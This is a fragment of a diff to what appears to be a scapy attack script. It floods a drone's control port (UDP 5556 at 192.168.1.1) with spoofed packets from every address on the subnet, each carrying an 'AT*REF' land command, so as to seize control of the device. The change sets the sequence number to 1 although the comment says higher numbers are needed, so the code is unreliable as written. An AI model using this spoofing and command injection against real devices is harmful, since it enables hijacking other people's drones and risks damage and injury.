@@ -84,7 +84,7 @@ if __name__ == "__main__":
 
     try:
         while(True):
-            land_cmd = "AT*REF=%d,0\r" % 9999999 # accepts any seqno higher than old
+            land_cmd = "AT*REF=%d,0\r" % 1 # accepts any seqno higher than old
             for i in xrange(256): # 8 bits in last field
                 real_ip = '192.168.1.' + str(i)
                 spoofed_pkt = IP(src=real_ip, dst='192.168.1.1')/UDP(dport=5556)/land_cmd
